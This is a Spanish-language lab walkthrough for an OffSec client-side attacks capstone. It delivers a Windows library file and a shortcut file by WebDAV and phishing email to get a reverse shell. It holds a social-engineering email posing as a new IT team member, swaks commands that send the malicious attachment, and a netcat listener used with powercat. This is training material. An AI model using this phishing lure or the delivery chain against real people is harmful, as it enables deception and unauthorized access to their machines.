# Walk: CapstoneLab - Client-side Attacks - Abusing Windows Library Files - VM Group 2 

## Fecha: 11/06/2025
## Host: Windows
## IP: 192.168.xxx.195 / 192.168.xxx.199 (victima)

---

## Objetivo
Capstone Lab: Enumerate the ADMIN (VM Group 2 - VM #4) machine and find a way to leverage Windows library and shortcut files to get code execution. 
Obtain a reverse shell and find the flag on the desktop for the Administrator user. 
You can use VM #3 of VM Group 2 to prepare your attack.

---
## Herramientas
1. nmap
2. gobuster
3. webdav
4. exiftool

---
## Procedimiento y comandos
1. Paso 1: Configuramos webdav en kali
```bash
┌──(root㉿kali)-[/home/…/OffSec/11-ClientSideAttacks/11.3-lab-WindowsLibraryFiles/Capstone]
└─# wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/OffSec/11-ClientSideAttacks/11.3-lab-WindowsLibraryFiles/Capstone/webdav 
Running without configuration file.
12:15:25.169 - WARNING : App wsgidav.mw.cors.Cors(None).is_disabled() returned True: skipping.
12:15:25.172 - INFO    : WsgiDAV/4.3.3 Python/3.13.2 Linux-6.11.2-amd64-x86_64-with-glibc2.40
12:15:25.172 - INFO    : Lock manager:      LockManager(LockStorageDict)
12:15:25.172 - INFO    : Property manager:  None
12:15:25.172 - INFO    : Domain controller: SimpleDomainController()
12:15:25.172 - INFO    : Registered DAV providers by route:
12:15:25.172 - INFO    :   - '/:dir_browser': FilesystemProvider for path '/usr/lib/python3/dist-packages/wsgidav/dir_browser/htdocs' (Read-Only) (anonymous)
12:15:25.172 - INFO    :   - '/': FilesystemProvider for path '/home/kali/OffSec/11-ClientSideAttacks/11.3-lab-WindowsLibraryFiles/Capstone/webdav' (Read-Write) (anonymous)
12:15:25.172 - WARNING : Basic authentication is enabled: It is highly recommended to enable SSL.
12:15:25.172 - WARNING : Share '/' will allow anonymous write access.
12:15:25.173 - WARNING : Share '/:dir_browser' will allow anonymous write access.
12:15:25.307 - INFO    : Running WsgiDAV/4.3.3 Cheroot/10.0.1 Python/3.13.2
12:15:25.307 - INFO    : Serving on http://0.0.0.0:80 ...
12:15:34.032 - INFO    : 127.0.0.1 - (anonymous) - [2025-06-11 15:15:34] "GET /" elap=0.002sec -> 200 OK
12:15:34.368 - INFO    : 127.0.0.1 - (anonymous) - [2025-06-11 15:15:34] "GET /style.css" depth=0, elap=0.024sec -> 200 OK
12:15:34.368 - INFO    : 127.0.0.1 - (anonymous) - [2025-06-11 15:15:34] "GET /script.js" depth=0, elap=0.023sec -> 200 OK
12:15:34.371 - INFO    : 127.0.0.1 - (anonymous) - [2025-06-11 15:15:34] "GET /logo.png" depth=0, elap=0.001sec -> 200 OK
12:15:34.399 - INFO    : 127.0.0.1 - (anonymous) - [2025-06-11 15:15:34] "GET /script.js" depth=0, elap=0.001sec -> 200 OK
12:15:34.495 - INFO    : 127.0.0.1 - (anonymous) - [2025-06-11 15:15:34] "GET /favicon.ico" depth=0, elap=0.001sec -> 200 OK
12:15:40.753 - INFO    : 127.0.0.1 - (anonymous) - [2025-06-11 15:15:40] "GET /test.txt" depth=0, elap=0.000sec -> 200 OK
12:15:40.962 - INFO    : 127.0.0.1 - (anonymous) - [2025-06-11 15:15:40] "GET /favicon.ico" depth=0, elap=0.000sec -> 404 Not Found
```
2. Paso 2: Nos conectamos por RDP a VM#3
```bash
┌──(root㉿kali)-[/home/…/OffSec/11-ClientSideAttacks/11.3-lab-WindowsLibraryFiles/Capstone]
└─# xfreerdp /u:"offsec" /p:"lab" /v:192.168.104.194 /dynamic-resolution +clipboard /cert:ignore
[12:25:56:879] [9531:9532] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: America/Argentina/Buenos_Aires
[12:25:56:381] [9531:9532] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[12:25:56:381] [9531:9532] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[12:25:56:495] [9531:9532] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[12:25:56:496] [9531:9532] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[12:25:56:496] [9531:9532] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
[12:25:57:283] [9531:9532] [INFO][com.freerdp.client.x11] - Logon Error Info LOGON_FAILED_OTHER [LOGON_MSG_SESSION_CONTINUE]
[12:25:57:424] [9531:9532] [WARN][com.freerdp.core.rdp] - pduType PDU_TYPE_DATA not properly parsed, 562 bytes remaining unhandled. Skipping.
```
3. Generamos los archvos **config.Library-ms** y **automatic_configuration.lnk**

> Estos archivos se generan como en los laboratorios anteriores.Y se copian en el servidor webdav en nuestro kali.

4. Ejecutamos `nc -nlvp 4444` y servimos **powercat.ps1**

5. Debemos buscar un vector de entrega para que la maquina victima acceda a nuestros recursos:

* Bucamos con gobuster algun directorio en el servidor web que nos pueda dar informacion valiosa sobre el entorno empresarial:
```bash
┌──(root㉿kali)-[/home/…/11-ClientSideAttacks/11.3-lab-WindowsLibraryFiles/Capstone/webdav]
└─# gobuster dir -x pdf -u 192.168.104.199 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.104.199
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              pdf
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/info.pdf             (Status: 200) [Size: 676858]
/Info.pdf             (Status: 200) [Size: 676858]
Progress: 9643 / 441122 (2.19%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 9673 / 441122 (2.19%)
===============================================================
Finished
===============================================================
```
* Podemos descargar el pdf y analizarlo con exiftool

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ exiftool info.pdf
ExifTool Version Number         : 13.10
File Name                       : info.pdf
Directory                       : .
File Size                       : 677 kB
File Modification Date/Time     : 2025:06:11 17:09:33-03:00
File Access Date/Time           : 2025:06:11 17:09:33-03:00
File Inode Change Date/Time     : 2025:06:11 17:09:33-03:00
File Permissions                : -rw-rw-r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.7
Linearized                      : No
Page Count                      : 2
Language                        : de-DE
Tagged PDF                      : Yes
XMP Toolkit                     : Image::ExifTool 12.41
Creator                         : Dave Wizard
Title                           : Local Communication
Author                          : Dave Wizard
Producer                        : Microsoft® PowerPoint® for Microsoft 365
Create Date                     : 2022:05:17 15:16:38+02:00
Creator Tool                    : Microsoft® PowerPoint® for Microsoft 365
Modify Date                     : 2022:05:17 15:16:38+02:00
Document ID                     : uuid:EAB0BD66-875C-4E2E-900D-ECCD665BAAA0
Instance ID                     : uuid:EAB0BD66-875C-4E2E-900D-ECCD665BAAA0
```

* Tenemos un nombre **Dave Wizard**
* Generamos un body con el siguiente contenido:
```
Hello! My name is Dwight, and I'm a new member of the IT Team. 

This week I am completing some configurations we rolled out last week.
To make this easier, I've attached a file that will automatically
perform each step. Could you download the attachment, open the
directory, and double-click "automatic_configuration"? Once you
confirm the configuration in the window that appears, you're all done!

If you have any questions, or run into any problems, please let me
know!
```
* Enviamos el mail:
```bash
sudo swaks -t dave.wizard@supermagicorg.com --from test@supermagicorg.com -ap --attach config.Library-ms --server 192.168.104.199 --body body.txt --header "Subject: Problems" --suppress-data 
Username: test@supermagicorg.com
Password: test
=== Trying 192.168.104.199:25...
=== Connected to 192.168.104.199.
<-  220 ADMIN ESMTP
 -> EHLO localhost
<-  250-ADMIN
<-  250-SIZE 20480000
<-  250-AUTH LOGIN
<-  250 HELP
 -> AUTH LOGIN
<-  334 VXNlcm5hbWU6
 -> dGVzdEBzdXBlcm1hZ2ljb3JnLmNvbQ==
<-  334 UGFzc3dvcmQ6
 -> dGVzdA==
<-  235 authenticated.
 -> MAIL FROM:<test@supermagicorg.com>
<-  250 OK
 -> RCPT TO:<dave.wizard@supermagicorg.com>
<-  250 OK
 -> DATA
<-  354 OK, send.
 -> 24 lines sent
<-  250 Queued (1.219 seconds)
 -> QUIT
<-  221 goodbye
=== Connection closed with remote host.
```
* En nuestro servidor obtenemos una peticion 200 y en el receptor nc obtenemos el reverse shell

---
## Troubleshooting

---

## Herramientas Alternativas
- [ ] **Herramienta 1:** Descripción breve (Comando)
- [ ] **Herramienta 2:** Descripción breve (Comando)
- [ ] **Herramienta 3:** Descripción breve (Comando)

